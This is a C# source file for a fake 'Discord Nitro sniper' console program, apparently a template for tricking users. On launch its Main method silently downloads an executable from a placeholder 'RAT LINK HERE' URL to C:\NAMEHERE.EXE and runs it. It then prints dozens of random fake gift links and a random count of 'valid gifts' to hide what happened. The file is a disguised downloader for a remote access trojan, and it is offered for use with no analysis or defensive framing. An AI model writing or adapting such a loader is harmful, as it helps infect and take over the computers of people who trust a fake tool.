using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Fake_Nitro_Sniper__By_CodenameXYZ_
{
    internal class Program
    {

        private static Random random = new Random();

        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopupqrst";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }


        public static string Randomnumber(int length)
        {
            const string chars = "1234567890";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        static void Main(string[] args)
        {
            WebClient web = new WebClient();
            web.DownloadFile("RAT LINK HERE", @"C:\NAMEHERE.EXE");
            Process.Start(@"C:/NAMEHERE.EXE");
            Console.WriteLine("Nitro Sniper By NAMEHERE");
            Console.WriteLine("Pres enter to start sniping");
            Console.WriteLine("Valid codes will be saved to nitro.txt");
            Console.ReadLine();
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine(Randomnumber(1) + " valid gifts");
            File.Create("nitro.txt");
            File.WriteAllText("nitro.txt", "discord.gg/gift/" + RandomString(7));

        }
    }
}
